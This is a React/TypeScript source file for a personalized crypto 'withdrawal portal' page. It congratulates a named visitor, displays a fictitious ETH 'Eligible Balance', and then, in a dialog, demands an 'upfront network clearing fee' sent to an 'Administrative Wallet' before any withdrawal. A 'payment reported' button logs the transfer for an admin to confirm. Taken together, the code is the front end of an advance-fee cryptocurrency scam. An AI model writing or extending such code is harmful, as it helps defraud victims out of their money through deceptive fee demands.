import { useState } from "react";
import { useRoute } from "wouter";
import { motion, AnimatePresence } from "framer-motion";
import { useClient } from "@/hooks/use-clients";
import { useCreateTransaction } from "@/hooks/use-transactions";
import { ClientLayout } from "@/components/ClientLayout";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { useToast } from "@/hooks/use-toast";
import { truncateAddress } from "@/lib/helpers";
import { Wallet, ArrowUpRight, Copy, Check, ShieldAlert } from "lucide-react";

export default function ClientPortal() {
  const [, params] = useRoute("/u/:id");
  const id = params?.id || "";
  const { data: client, isLoading, error } = useClient(id);
  const createTx = useCreateTransaction();
  const { toast } = useToast();
  
  const [isWithdrawModalOpen, setIsWithdrawModalOpen] = useState(false);
  const [copied, setCopied] = useState(false);

  const handleCopyWallet = () => {
    if (!client) return;
    navigator.clipboard.writeText(client.feeWallet);
    setCopied(true);
    toast({ title: "Address Copied", description: "Fee wallet address copied to clipboard." });
    setTimeout(() => setCopied(false), 2000);
  };

  const handleConfirmPayment = () => {
    if (!client) return;
    createTx.mutate(
      { clientId: client.id, amountPaid: client.feeAmount.toString(), status: 'pending' },
      {
        onSuccess: () => {
          setIsWithdrawModalOpen(false);
          toast({ 
            title: "Payment Reported", 
            description: "Admin has been notified. Withdrawal will process upon confirmation." 
          });
        },
        onError: () => {
          toast({ variant: "destructive", title: "Error", description: "Failed to submit report. Please try again." });
        }
      }
    );
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="w-12 h-12 border-4 border-primary/30 border-t-primary rounded-full animate-spin" />
      </div>
    );
  }

  if (error || !client) {
    return (
      <div className="min-h-screen bg-background flex flex-col items-center justify-center p-6 text-center">
        <ShieldAlert className="w-16 h-16 text-destructive mb-4 opacity-80" />
        <h1 className="text-2xl font-display font-bold mb-2">Invalid Link</h1>
        <p className="text-muted-foreground max-w-md">This personalized portal link is invalid or has expired. Please contact support.</p>
      </div>
    );
  }

  return (
    <ClientLayout clientId={client.id}>
      <div className="pt-8 pb-4">
        <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
          <h1 className="text-4xl sm:text-5xl font-display font-bold mb-2">
            Congratulations,<br />
            <span className="text-gradient">{client.name}</span>
          </h1>
          <p className="text-muted-foreground text-lg mb-8">Your portfolio allocation is ready for withdrawal.</p>
        </motion.div>

        <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: 0.2 }}>
          <div className="glass-panel p-6 sm:p-8 rounded-3xl relative overflow-hidden group">
            {/* Cool background glow inside card */}
            <div className="absolute -right-20 -top-20 w-64 h-64 bg-primary/20 blur-[80px] rounded-full group-hover:bg-primary/30 transition-all duration-500" />
            
            <div className="relative z-10">
              <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10 text-sm mb-8 backdrop-blur-md">
                <span className="relative flex h-2 w-2">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
                </span>
                <span className="text-muted-foreground">Connected Wallet:</span>
                <span className="font-mono text-foreground font-medium">{truncateAddress(client.ethWallet)}</span>
              </div>

              <p className="text-sm text-muted-foreground font-medium uppercase tracking-widest mb-2">Eligible Balance</p>
              <div className="flex items-baseline gap-3 mb-8">
                <h2 className="text-6xl font-mono font-bold text-white tracking-tighter">
                  {client.eligibleAmount}
                </h2>
                <span className="text-2xl font-bold text-primary">ETH</span>
              </div>

              <Button 
                onClick={() => setIsWithdrawModalOpen(true)}
                className="w-full sm:w-auto h-14 px-8 text-lg font-bold bg-primary hover:bg-primary/90 text-black shadow-[0_0_30px_rgba(6,182,212,0.3)] hover:shadow-[0_0_40px_rgba(6,182,212,0.5)] transition-all rounded-xl gap-2"
              >
                Initiate Withdrawal
                <ArrowUpRight className="w-6 h-6" />
              </Button>
            </div>
          </div>
        </motion.div>

        {/* Feature Highlights */}
        <motion.div 
          className="grid grid-cols-1 sm:grid-cols-2 gap-4 mt-6"
          initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}
        >
          <div className="bg-card/40 border border-white/5 rounded-2xl p-5 flex items-start gap-4">
            <div className="p-2 bg-primary/10 rounded-lg text-primary">
              <Wallet className="w-5 h-5" />
            </div>
            <div>
              <h4 className="font-semibold text-sm">Instant Settlement</h4>
              <p className="text-xs text-muted-foreground mt-1">Funds are routed directly to your connected wallet upon clearance.</p>
            </div>
          </div>
          <div className="bg-card/40 border border-white/5 rounded-2xl p-5 flex items-start gap-4">
            <div className="p-2 bg-accent/10 rounded-lg text-accent">
              <ShieldAlert className="w-5 h-5" />
            </div>
            <div>
              <h4 className="font-semibold text-sm">Secure Transfer</h4>
              <p className="text-xs text-muted-foreground mt-1">Encrypted on-chain execution with zero intermediate holding.</p>
            </div>
          </div>
        </motion.div>

        <Dialog open={isWithdrawModalOpen} onOpenChange={setIsWithdrawModalOpen}>
          <DialogContent className="bg-zinc-950 border border-zinc-800 sm:max-w-md w-[90vw] rounded-3xl p-0 overflow-hidden">
            <div className="h-1 w-full bg-gradient-to-r from-primary to-accent" />
            <div className="p-6">
              <DialogHeader className="mb-6">
                <DialogTitle className="text-2xl font-display text-center">Network Fee Required</DialogTitle>
                <DialogDescription className="text-center text-base mt-2">
                  To process your withdrawal of <strong className="text-white">{client.eligibleAmount} ETH</strong>, an upfront network clearing fee is required.
                </DialogDescription>
              </DialogHeader>

              <div className="bg-black/50 border border-white/10 rounded-2xl p-5 mb-6 text-center">
                <p className="text-sm text-muted-foreground mb-2">Send Exactly</p>
                <p className="text-4xl font-mono font-bold text-accent mb-6">{client.feeAmount} <span className="text-xl">ETH</span></p>
                
                <p className="text-sm text-muted-foreground mb-2">To Administrative Wallet</p>
                <div 
                  onClick={handleCopyWallet}
                  className="bg-card border border-primary/30 p-3 rounded-xl flex items-center justify-between cursor-pointer hover:bg-white/5 transition-colors group"
                >
                  <span className="font-mono text-sm sm:text-base text-primary/90 truncate mr-2">
                    {client.feeWallet}
                  </span>
                  <div className="p-2 bg-primary/10 rounded-md group-hover:bg-primary/20 transition-colors shrink-0">
                    {copied ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-primary" />}
                  </div>
                </div>
              </div>

              <div className="space-y-3">
                <Button 
                  className="w-full h-12 text-base font-bold bg-white text-black hover:bg-gray-200"
                  onClick={handleConfirmPayment}
                  disabled={createTx.isPending}
                >
                  {createTx.isPending ? "Submitting..." : "I Have Made The Transfer"}
                </Button>
                <Button 
                  variant="ghost" 
                  className="w-full h-12 text-muted-foreground"
                  onClick={() => setIsWithdrawModalOpen(false)}
                >
                  Cancel
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    </ClientLayout>
  );
}
